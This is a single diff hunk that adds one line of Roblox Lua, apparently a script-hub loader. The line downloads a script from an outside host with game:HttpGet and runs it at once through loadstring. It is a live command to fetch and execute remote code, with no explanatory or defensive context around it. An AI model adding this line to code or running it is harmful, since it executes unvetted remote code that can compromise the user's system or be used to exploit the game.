@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://noxscript.com/assets/active-loader.lua"))()
